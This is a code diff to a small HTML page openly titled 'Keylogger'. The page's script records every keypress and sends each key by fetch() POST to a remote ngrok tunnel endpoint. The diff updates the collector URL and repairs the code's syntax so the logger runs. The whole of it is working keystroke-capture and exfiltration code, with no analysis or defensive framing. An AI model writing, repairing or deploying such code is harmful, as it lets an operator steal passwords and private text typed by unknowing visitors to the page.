@@ -6,13 +6,14 @@
     <title>Keylogger</title>
     <script>
         document.addEventListener('keypress', function(event) {
-            fetch('https://13d6-2405-201-c012-b8b6-fcf0-c76e-a84d-b39.ngrok-free.app:5000/log', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        body: JSON.stringify({ key: event.key }),
-    }).catch(error => console.error('Error:', error));
+            fetch('https://f66f-2405-201-c012-b8b6-fcf0-c76e-a84d-b39.ngrok-free.app/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ key: event.key }),
+            }).catch(error => console.error('Error:', error));
+        });
     </script>
 </head>
 <body>
